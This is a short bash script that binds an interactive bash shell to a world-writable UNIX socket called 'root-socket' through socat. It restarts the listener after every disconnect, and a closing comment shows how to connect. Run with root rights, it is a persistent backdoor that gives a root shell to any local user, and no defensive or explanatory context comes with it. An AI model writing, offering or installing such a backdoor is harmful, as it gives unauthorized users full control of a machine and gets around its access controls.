#!/bin/bash

SOCKET_PATH="/home/jagdish/root-socket"

# Clean up old socket file
[ -e "$SOCKET_PATH" ] && rm -f "$SOCKET_PATH"

echo "[+] Listening on UNIX socket $SOCKET_PATH..."

# Loop to restart after disconnect
while true; do
  socat UNIX-LISTEN:$SOCKET_PATH,reuseaddr,fork EXEC:"/bin/bash -i",pty,stderr,setsid,sigint,sane &
  
  # Wait for the socket to be created
  while [ ! -e "$SOCKET_PATH" ]; do
    sleep 0.1
  done

  # Set permissions after it's created
  chmod 777 "$SOCKET_PATH"

  # Wait for socat to exit before restarting loop
  wait $!
  sleep 1
done

#socat - UNIX-CONNECT:/home/jagdish/root-socket